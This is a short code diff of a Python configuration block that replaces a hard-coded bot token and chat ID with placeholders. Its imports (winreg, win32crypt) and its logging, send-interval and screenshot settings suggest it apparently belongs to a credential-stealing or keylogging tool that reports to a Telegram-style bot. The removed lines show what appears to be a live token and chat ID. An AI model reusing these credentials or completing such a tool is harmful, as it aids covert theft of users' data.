@@ -18,8 +18,8 @@ import winreg
 import win32crypt
 
 CONFIG = {
-    "TOKEN": "5492423299:AAHtiG3nmBrS0yNGQigjxJbFm9nWgbTwVCo",
-    "CHAT_ID": "5371294058",
+    "TOKEN": "BOT_ID",
+    "CHAT_ID": "USER_ID",
     "SEND_INTERVAL": 10,
     "LOG_FILE": "log.txt",
     "SCREENSHOT_INTERVAL": 300,
